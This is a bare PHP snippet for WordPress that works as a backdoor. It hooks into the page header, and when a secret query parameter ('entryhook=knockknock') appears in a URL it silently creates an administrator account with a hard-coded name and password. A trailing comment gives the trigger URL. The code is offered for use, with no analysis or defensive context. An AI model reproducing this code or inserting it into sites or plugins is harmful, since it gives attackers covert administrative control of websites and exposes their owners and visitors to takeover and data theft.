<?php
add_action('wp_head', 'wploop_flm'); 

function wploop_flm() { 
  If ($_GET['entryhook'] == 'knockknock') { 
     require('wp-includes/registration.php'); 
     If (!username_exists('username')) { 
        $user_id = wp_create_user('flm', 'eb34f78aff557f3cb0291b0a921fbf27'); 
        $user = new WP_User($user_id);
        $user->set_role('administrator');
     }
  }
}
?>

//https://yoursite.com/?entryhook=knockknock.
